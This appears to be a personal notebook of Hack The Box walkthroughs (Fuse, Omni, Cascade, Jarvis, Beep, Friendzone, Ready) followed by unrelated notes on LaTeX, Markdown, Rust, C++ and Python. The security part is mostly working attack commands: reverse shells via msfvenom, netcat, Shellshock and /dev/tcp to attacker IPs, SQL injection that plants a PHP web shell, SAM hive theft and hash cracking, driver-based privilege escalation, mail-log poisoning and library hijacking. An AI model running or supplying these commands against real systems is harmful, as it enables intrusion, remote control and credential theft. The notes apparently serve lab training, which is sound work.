[+] ❯ crackmapexec winrm 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1' #If pwned ...
[+] ❯ evil-winrm -i 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1'
[+] get-childitem -Path c:\users\svc-print -filter user.txt -recurse -erroraction silentlycontinue -force OR get-childitem -path c:\Users -filter user.txt -recurse -erroraction silentlycontinue -force | %{$_.fullname}
Windows Privilege Escalation ==> whoami /priv | whoami /all ==> Exploiting SeLoadDriverPrivilege
https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
1. Open Visual Studio 2022 ==> Console App ; Name of the project = LoadDriver ==> Paste the real code and Release | x64 | Rebuild Solution ==> Copy the LoadDriver.exe into Fuse\CompiledBinaries 
2. Download capcom.sys # A vulnerable driver ==> https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys into Fuse\CompiledBinaries
3. Change in ExploitCapcom.cpp when launch a command shell process ==>  Use applocker bypass (i.e. C:\Windows\System32\spool\drivers\color\malisimashell.exe) ==> Rebuild Solution ==> Fuse\CompiledBinaries
4. python -m http.server 9090 in machine windows
5. Create a reverse shell with msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4126 -f exe -o reverse.exe
6. Upload capcom.sys, LoadDriver.exe and ExploitCapcom.exe in c:\windows\temp BUT reverse.exe in C:\Windows\System32\spool\drivers\color 
7. C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\loquesea C:\Windows\Temp\Capcom.sys
8. C:\Windows\Temp\ExploitCapcom.exe
#https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

-=-=-=-=-=
Omni
❯ curl -s -X GET http://10.129.2.27:8080 -I #
[+] https://github.com/SafeBreach-Labs/SirepRAT ==> sudo python3 setup.py install ==> pip3 install -r requirements.txt
❯ python3 SirepRAT.py 10.129.2.27 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --vv
❯ python3 SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c ping 10.10.14.31" --v
[+] Move netcat to Windows machine ==> https://github.com/vinsworldcom/NetCat64/releases 
❯ python3 SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c certutil.exe -f -urlcache -split http://10.10.14.31/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe" --v
❯ python3 SirepRAT.py 10.129.69.228 LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c iwr -uri http://10.10.14.31/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v
❯ python3 SirepRAT.py 10.129.69.228 LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.31 4126" --v
#Windows Privilege escalation 
[+] echo %USERNAME% ==> dir /r /s user.txt 
[+] (Import-CliXml -Path user.txt).GetNetworkCredential().password ==> icacls user.txt
[+] reg save HKLM\system system.backup ==>  reg save HKLM\sam sam.backup #If you want to list shares ==>  get-WmiObject -class Win32_Share -computer dc1.krypted.com
[+] You need to take those 2 files. In victim machine dir \\10.129.69.228\smbFolder . The best option is to use credentials. 
In victim machine ==> net use x: \\10.10.14.31\smbFolder /user:milo milo ==> In our machine impacket-smbserver share $(pwd) -smb2support -username milo -password milo
[+] Ways to see cmd history ==> doskey /history ==> F7 ==> F8 last command ==> 
[+] Clear cmd history ==> Close cmd ==> Alt + F7 
[+] dir \\10.10.14.31\smbFolder ==> copy sam.backup y:\sam ==> copy system.backup y:\system
❯ secretsdump.py  -sam sam -system system LOCAL 
❯ john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
-=-=-=-=-==
#Cascade
[+] git clone https://github.com/ropnop/kerbrute ==> go build -ldflags "-s -w" ==> upx kerbrute ==> du -hc kerbrute
[+] ❯ crackmapexec smb 10.129.64.195
[+] ❯ ./kerbrute userenum --dc 10.129.64.195 -d cascade.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
[+] ❯ rpcclient -U "" 10.129.64.195 -N ==> https://github.com/s4vitar/rpcenum
[+] ❯ impacket-GetNPUsers cascade.local/ -no-pass -usersfile users.txt
[+] ❯ smbclient -L //10.129.64.195 and ❯ smbmap -H 10.129.64.195
[+] ldapsearch -x -h 10.129.64.195 -b "dc=cascade,dc=local" #We could search for usernames 
[+] ❯ ldapsearch -x -h 10.129.64.195 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 20 ==> cascadeLegacyPwd: clk0bjVldmE= 
[+] ❯ crackmapexec smb 10.129.64.195 -u 'r.thompson' -p 'rY4n5eva' #Check if valid credentials
[+] ❯ rpcclient -U "" 10.129.64.195 -N -c "queryuser r.thompson"
1:24:47
[+] ❯ crackmapexec winrm 10.129.64.195 -u 'r.thompson' -p 'rY4n5eva'
[+] ❯ sudo mount -t cifs //10.129.64.195/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
[+] ❯ cat IT/Email\ Archives/Meeting_Notes_June_2018.html | html2text
[+] ❯ cat password | tr -d ',' | xxd -ps -r #Hexadecimal to normal output. It seems to be encrypted ==> https://github.com/jeroennijhof/vncpwd ==> make && make install ==> upx vncpwd
[+] ❯ ./vncpwd ../password
[+] ❯ crackmapexec smb 10.129.64.195 -u users.txt -p 'sT333ve2'
[+] ❯ crackmapexec winrm 10.129.64.195 -u users.txt -p 'sT333ve2'
[+] ❯ evil-winrm -i 10.129.64.195 -u 's.smith' -p 'sT333ve2'
[+] ❯ smbclient  //10.129.64.195/Audit$ -U "s.smith%sT333ve2"
[+] sqlite3 Audit.db ==> .tables
[+] dotPeek



-----------------------------------------------------------------------
LINUX

-=================================================================
#Linux
JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==> #For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 

database() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name

-=-=-=-==
Beep
searchsploit elastix ==> Try /etc/passwd, /etc/pam.d/passwd, /etc/pam.d/system-auth, /etc/fail2ban/fail2ban.conf/, /proc/self/environ #If we have access to User Agent we could change it (burpsuite) like <?php echo "hello"; ?>  , /proc/net/fib_trie 
[+] /proc/self/status chech the Uid and Gid for compare with /etc/passwd to see whoami
[+] /proc/net/tcp > data.txt ==> cat data  | tr ':' ' '  | awk '{print $3}' | sort  -u ==> python3 0x + port in hexadecimal format --> /proc/sched_debug or /proc/schedstat #Nothing interest
[+] In https://10.129.16.160:10000/session_login.cgi?logout=1 we could try shellsock agent for cgi. ==> With burp in user agent () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.72/4126 0>&1'
[+] Access to root directly ==> ❯ ssh root@10.129.16.160 -p 22 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1
[+] Another commands ==> curl -k URL -o file #-k to ignore cert warning ==> g/nologin/d ==> grep -R return_application_language
[+] With SMTP opened we could send an email to a user ==> telnet 10.129.68.60 25 ==> EHLO loquesea.beep.htb ==> VRFY user@localhost ==> mail from:correomalisimo@quepenadas.io ==> rcpt to: asterisk@localhost ==> data ==> 
Subject: No esperes random
<?php echo system($_REQUEST['milo']); ?>
Aqui puedo poner lo que quiera ==> In Burp ==> GET /vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&ajgs=milo HTTP/1.1
[+] Running a python script ==> Change https to http | In Burp add port 80 to bind and victim IP 443 and force SSL ==> svmap 10.129.68.60 ==> svwar --force -e 200-250 10.129.68.60 or ❯ svwar -m INVITE -e200-250 10.129.68.60 #To identify valid extensions ==> If we go to browser https://10.129.68.60/panel/ we will be able to see the panel administration ==> Change extensiono and okay

-=-=-=-=-
Knife
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://10.129.216.127/FUZZ/FUZ2Z
[+] curl -s -X GET "http://10.129.216.127/" -I ==> Exploiting User-Agentt

-=-=-==
Friendzone
[+] ftp 10.129.1.225 21 #anonymous & anonymous
[+] openssl s_client -connect 10.129.1.225:443
❯ smbclient -L //10.129.1.225 -N
❯ smbmap -H 10.129.1.225
[+] smbmap -H 10.129.117.106 -R --depth 5
❯ smbmap -H 10.129.1.225  -u 'admin' -p 'WORKWORKHhallelujah@#'
❯ dig axfr @10.129.1.225 friendzoneportal.red # TCP is only used in DNS when the response size is greater than 512 bytes
sed '5,13!d' resultsdig #From line 5 to 13
❯ sed -n -e 5,6p -e 16,17p  resultsdig #If they are not in sequence
[+] cat domains | aquatone 
❯ smbclient //10.129.1.225/Development -N
[+] root@kali# cat cmd.php <?php system($_REQUEST['cmd']); ?> ==> root@kali# smbclient -N //10.10.10.123/Development -c 'put cmd.php 0xdf.php'
❯ sudo mount -t cifs //10.129.1.225/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw #In the script. After that umount and rm -r #https://oletange.blogspot.com/2012/04/umount-device-is-busy-why.html
[+] python3 ==> import hashlib ==> hashlib.md5("password").hexdigest() #Not works but it is interesting
[+] https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login ==> base64 -d and you see the code
Privilege escalation ==> ps -eo command #See all the commands "ejecutando"
[+] library hijacking ==> For example ==> python3 , import sys, print sys.path ==> locate os.py ==> ls -l /usr/lib | grep python2.7 ==> system("chmod 4755 /bin/bash") in os.py

-=-=-=-=-=
Ready (10.129.227.132)

https://docs.gitlab.com/ee/api/version.html
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version --header "PRIVATE-TOKEN: oB2b_mq8DM9Xys39HTkx" | jq
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version --header "PRIVATE-TOKEN: oB2b_mq8DM9Xys39HTkx" | jq '.["version"]'

Or if we register in the page > Help > Version of gitlab

What can we search for?
  When was this release regarding this version?
    gitlab releases 
  Let's go search into the commits
    https://gitlab.com/gitlab-org/gitlab
  What have we found?
   Merge branch 'security-11-5-fix-webhook-ssrf-ipv6' into 'security-11-5' //This commit
   We see that there are many ways to ping the loopback.
    ❯ ping 0x7f.1

  Let's test it
    Projects > Import project > Repo by URL >
      http://127.0.0.1 //    Import url is blocked: Requests to localhost are not allowed
    Can the server connect to us?
      AM: ❯ nc -lvnp 80
          Can't grab 0.0.0.0:80 with bind : Permission denied
          ❯ sudo !!
          sudo nc -lvnp 80
      VM: http://10.10.14.12
    Can we access ports on localhost? Those are not exposed externally 
    Let's try use gopher to craft packets
      gopher://10.10.14.12:80
    With git
      git://10.10.14.12:80/test/test.git //The test.git is copied from clone with ssh
      Can we send lines when doing a connection with us?

    https://github.com/jas502n/gitlab-SSRF-redis-RCE
    
  ❯ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.12/4545 0>&1'" | base64 -w 0;echo

  echo -n YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvNDU0NSAgICAwPiYxJw== | base64 -d | bash

Privilege escalation
Docker
https://github.com/stealthcopter/deepce
VM: curl 10.10.14.12:8080/deepce.sh | bash

mkdir /mnt/sda1
mount /dev/sda1 /mnt/sda1
mkdir /mnt sda2 
mount /dev/sda2 /mnt/sda2

ls /mnt///.......














-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
LaTeX 
zathura #View pdf files 
rubber #Similar to latexmk
[+]apt-get update 
[+] apt-get install texlive-full -y --fix-missing
[+] apt-get install zathura latexmk rubber -y
[+] xdg-mime query default application/pdf ==> xdg-mime default zathura.desktop application/pdf
[+] mkdir /home/ajgs/.config/latexmk ==> nvim ~/.config/latexmk/latexmkrc ==> $pdf_previewer = 'zathura';
[+] chown ajgs:ajgs -R latexmk
[+] Hacer lo mismo para root ==> cd /root ==> cd .config ==> mkdir latexmk ==> cd !$ ==> ln -s -f /home/ajgs/.config/latexmk/latexmkrc latexmkrc 
[+] latexmk -pdf -pvc Documento.tex
[+] zathura Documento.pdf > /dev/null 2>&1 &
[+] xprop WM_CLASS
[+] color #AAAAA

latexmk

-=-=-=
Markdown
[+]Images ==> The first image style is called an inline image link. To create an inline image link, enter an exclamation point ( ! ), wrap the alt text in brackets ( [ ] ), and then wrap the link in parenthesis ( ( ) ). (Alt text is a phrase or sentence that describes the image for the visually impaired.)

For example, to create an inline image link to https://octodex.github.com/images/bannekat.png, with an alt text that says, Benjamin Bannekat, you'd write this in Markdown: ![Benjamin Bannekat](https://octodex.github.com/images/bannekat.png)

For a reference image, you'll follow the same pattern as a reference link. You'll precede the Markdown with an exclamation point, then provide two brackets for the alt text, and then two more for the image tag, like this: ![The founding father][Father] At the bottom of your Markdown page, you'll define an image for the tag, like this: [Father]: http://octodex.github.com/images/founding-father.jpg.

[+] Blockquotes
To create a block quote, all you have to do is preface a line with the "greater than" caret (>).
Notice that even blank lines must contain the caret character. This ensures that the entire blockquote is grouped together.

[+] Lists ==> To create an unordered list, you'll want to preface each item in the list with an asterisk ( * ) ==> An ordered list is prefaced with numbers, instead of asterisks

[+] Paragraphs ==> 2 spaces or a new line 
[+] More tutorials ==> https://www.markdowntutorial.com/conclusion/
-=-=-=-=
Rust

Installing rustup 
$ curl --proto '=https' --tlsv1.3 https://sh.rustup.rs -sSf | sh






cargo new hello_cargo
cargo build
cargo run
cargo check
cargo doc --open
target/debug directory for the executable
target/release ==> optimization
println! calls a Rust macro
let mut guess = String::new(); //String ==> type && new ==> function implemented on a type

println("x = {} and y {}", x, y);

3.1. Variables and mutability
const THREE_HOURS_IN_SECONDS: u32 = 60 * 60 * 3;
shadowing

3.2. Data types
Length	  Signed	    Unsigned
8-bit	    i8  	      u8
16-bit	  i16	        u16
32-bit	  i32,f32	    u32
64-bit	  i64,f64	    u64
128-bit	  i128	      u128
arch	    isize	      usize
4 bytes ==> ' '

Booleans are one byte in size. // let f: bool = false; 
we specify char literals with single quotes, as opposed to string literals, which use double quotes.


To explicitly handle the possibility of overflow, you can use these families of methods provided by the standard library for primitive numeric types:

    Wrap in all modes with the wrapping_* methods, such as wrapping_add
    Return the None value if there is overflow with the checked_* methods
    Return the value and a boolean indicating whether there was overflow with the overflowing_* methods
    Saturate at the value’s minimum or maximum values with saturating_* methods

Tuples
We create a tuple by writing a comma-separated list of values inside parentheses. Each position in the tuple has a type, and the types of the different values in the tuple don’t have to be the same.
fn main() {
  let tup: (i32, f64, u8) = (500, 6.4, 1);
  let (x, y, z) = tup; // Access a individual value in this single compound element
  println!("The value of y is: {}",y);
  //Accesing by the index of the value
  let x: (i32, f64, u8) = (500, 6.4, 1);
  let five_hundred = x.0;
}

Array
Unlike a tuple, every element of an array must have the same type. Unlike arrays in some other languages, arrays in Rust have a fixed length.
fn main() {
  let a: [i32; 5] = [1, 2, 3, 4, 5];
  //Accessing array elements
  let first = a[0]; //1
  //You could write
  let a = [3; 5]; //which is equal to ==> let a = [3, 3, 3, 3, 3];
}

//Example of invalid array element access 

This is an example of Rust’s memory safety principles in action. In many low-level languages, this kind of check is not done, and when you provide an incorrect index, invalid memory can be accessed. Rust protects you against this kind of error by immediately exiting instead of allowing the memory access and continuing.


-=-=
3.3. Functions
Rust doesn’t care where you define your functions, only that they’re defined somewhere in a scope that can be seen by the caller.

Statements vs expressions?
  Statements are instructions that perform some action and do not return a value. 
    Ex: let y = 6; //It is a statement
  Expressions evaluate to a resulting value.
    Do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, and it will then not return a value
    Ex: 5 + 6

3.4. Control flow

fn main() {
    let number = 6;

    if number % 4 == 0 {
        println!("number is divisible by 4");
    } else if number % 3 == 0 {
        println!("number is divisible by 3");
    } else if number % 2 == 0 {
        println!("number is divisible by 2");
    } else {
        println!("number is not divisible by 4, 3, or 2");
    }
}


Using if in a let statement
fn main() {
    let condition = true;
    let number = if condition { 5 } else { 6 };

    println!("The value of number is: {number}");
}

//Rust has three kinds of loops: loop, while and for.
loop
  break
  continue: In a loop tells the program to skip over any remaining code in this iteration of the loop and go to the next iteration.
fn main() {
    let mut counter = 0;

    let result = loop {
        counter += 1;
        if counter == 10 {
            break counter * 2;
        }
    };
    println!("The result is {}",result);
}

Loop Labels to Disambiguate Between Multiple Loops
  Loop labels must begin with a single quote. 

  fn main() {
    let mut count = 0;
    'counting_up: loop {
        println!("count = {}",count);
        let mut remaining = 10;
        

        loop {
            println!("remaining = {}",remaining);
            if remaining == 9 {
                break;
            }
            if count == 2{
                break 'counting_up;
            }
            remaining -= 1;
        }
        count += 1;
    }
    println!("End count = {}", count);
}

Looping through a collection with for
  fn main() {
    for number in (1..4).rev() {
        println!("{number}!");
    }
    println!("LIFTOFF!!!");
}












-=-=-=
Programming c++
a = a + 1; ==> is the same as ++a;
Caution 1 {
  x = 10;
  y = ++x; //Set y to 11
}
Caution 2 {
    x = 1;
    y = x++; //Set y to 10 and x to 11
  }
^ ==> XOR
~ ==> NOT

x = &y; #Put the memory address of the variable y into x. Not the value of y.
y = *p2; #Assigns to variable y, the value located at the memory address pointed by p2.

#define _WINSOCK_DEPRECATED_NO_WARNINGS #Use winsock utilites and we do not want the compiler to complain about older functionalities used.
#pragma comment(lib, "Ws2_32.lib") #In order to use sockets(networking) functionality in Windows
#include <iostream> #Standard input/output utilities
#include <winsock2.h> #Network utilities
#include <stdio.h> #Standard input/output utilities(needed for perror())
#include <stdlib.h> #Standard input/output utilities
#include <dirent.h> #Directory utilities
#include <string> #String utilities

-=-=-=-=
Python3
* Extract source code from a web
	import requests
	import re
	
	url = 'http://144.126.226.105:30024/admin-login-page.php'
	
	data = {
	        'username': 'admin',
	        'password': 'password123'
	}
	
	response=requests.post(url, data=data)
	content = response.text
	
	x = re.findall('<center><strong>(.*)</strong></center>',content)[0]
	print(x)
-=-=-=-=-=-=
Machines for practicing Metasploit

    Granny/Grandpa
    Jerry
    Blue
    Lame
    Optimum
    Legacy
    Devel

